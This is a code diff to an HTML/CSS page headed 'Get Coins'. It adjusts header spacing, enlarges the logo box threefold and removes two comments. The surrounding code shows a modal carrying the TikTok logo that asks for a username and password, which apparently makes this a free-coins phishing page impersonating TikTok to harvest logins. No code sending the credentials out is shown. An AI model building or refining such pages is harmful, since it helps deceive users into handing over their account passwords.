@@ -34,21 +34,22 @@ body {
   display: flex;
   justify-content: space-between;
   align-items: center;
-  margin-bottom: 0;
-  margin-top: -15px;
+  margin-top: 15px; /* moved heading down slightly */
+  margin-bottom: 10px;
 }
 
 .header h1 {
   margin: 0;
   font-size: 26px;
   font-weight: bold;
+  margin-top: 10px; /* added downward spacing for "Get Coins" */
 }
 
-/* Logo box */
+/* Logo box — enlarged 3× */
 .logo-box {
-  width: 45px;
-  height: 45px;
-  border-radius: 8px;
+  width: 135px; /* was 45px */
+  height: 135px; /* was 45px */
+  border-radius: 12px;
   overflow: hidden;
   background-color: #f5f5f5;
   display: flex;
@@ -62,13 +63,13 @@ body {
   object-fit: contain;
 }
 
-/* Sub-text spacing adjusted slightly down */
+/* Sub-text shifted further down */
 .sub-text {
   font-size: 16px;
   color: #333;
   font-weight: 600;
-  margin-top: 8px;
-  margin-bottom: 18px;
+  margin-top: 20px; /* was 8px */
+  margin-bottom: 25px; /* was 18px */
   line-height: 1.3;
 }
 
@@ -309,7 +310,7 @@ body {
   <div class="header">
     <h1>Get Coins</h1>
     <div class="logo-box">
-      <img src="https://via.placeholder.com/45x45?text=Logo" alt="Logo">
+      <img src="https://via.placeholder.com/135x135?text=Logo" alt="Logo">
     </div>
   </div>
 
@@ -371,7 +372,6 @@ body {
   <div class="loader"></div>
 </div>
 
-<!-- ✅ Login modal -->
 <div class="login-modal" id="loginModal">
   <div class="login-content">
     <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"
@@ -453,7 +453,6 @@ function completeLogin() {
   updateButton();
 }
 
-// ✅ Enable Continue only if both fields filled
 const usernameField = document.getElementById("usernameInput");
 const passwordField = document.getElementById("passwordInput");
 const continueBtn = document.getElementById("continueBtn");
